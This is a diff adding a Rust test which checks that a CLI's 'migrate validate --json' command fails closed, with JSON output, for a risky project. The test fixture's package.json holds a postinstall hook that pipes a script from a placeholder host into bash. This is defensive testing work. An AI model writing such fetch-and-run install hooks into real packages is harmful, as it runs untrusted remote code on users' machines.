@@ -1752,6 +1752,45 @@ fn migrate_validate_fails_for_risky_project_and_returns_non_zero_exit() {
 }
 
 #[test]
+fn migrate_validate_json_fails_closed_for_risky_project() {
+    let temp = TempDir::new().expect("temp dir");
+    let project_path = temp.path().join("project");
+    std::fs::create_dir_all(&project_path).expect("project dir");
+
+    std::fs::write(project_path.join("index.js"), "console.log('hello');\n").expect("write js");
+    std::fs::write(
+        project_path.join("package.json"),
+        r#"{
+  "name": "demo",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/install.sh | bash"
+  }
+}
+"#,
+    )
+    .expect("write package manifest");
+
+    let project_arg = project_path.to_string_lossy().to_string();
+    let output = run_cli(&["migrate", "validate", &project_arg, "--json"]);
+    assert!(
+        !output.status.success(),
+        "validate --json should fail for risky project"
+    );
+
+    let stdout = String::from_utf8_lossy(&output.stdout);
+    let payload: serde_json::Value = serde_json::from_str(&stdout).unwrap_or_else(|err| {
+        panic!("migrate validate --json fail-closed stdout must be JSON ({err}):\n{stdout}")
+    });
+    assert_eq!(payload["status"], serde_json::json!("fail"));
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(
+        !stderr.contains("Error: migration validation failed for"),
+        "--json must not append a second human Error line after the JSON report: {stderr}"
+    );
+}
+
+#[test]
 fn migrate_validate_passes_for_hardened_project() {
     let temp = TempDir::new().expect("temp dir");
     let project_path = temp.path().join("project");
